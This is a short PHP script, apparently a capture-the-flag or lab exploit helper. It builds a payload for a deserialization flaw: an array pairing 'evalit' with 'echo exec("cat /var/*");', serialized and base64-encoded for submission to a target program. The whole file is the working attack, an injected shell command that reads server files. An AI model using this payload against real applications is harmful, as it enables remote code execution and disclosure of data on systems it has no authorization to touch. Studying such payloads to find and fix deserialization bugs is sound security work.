<?php

// reference: https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize
// $a=array( '0' => 'sum', '1'=> '3', '2'=>'2');
$a=array( '0' => 'evalit', '1'=> 'echo exec("cat /var/*");');
print_r($a);
echo "\n";

$b=serialize($a);
print_r($b);
echo "\n\n";

$payload=base64_encode($b);
print_r($payload);
echo "\n\n";

// just to make sure and see what the output and what to expect the program to takes
$d=unserialize($b);
print_r($d);
echo "\n";

?>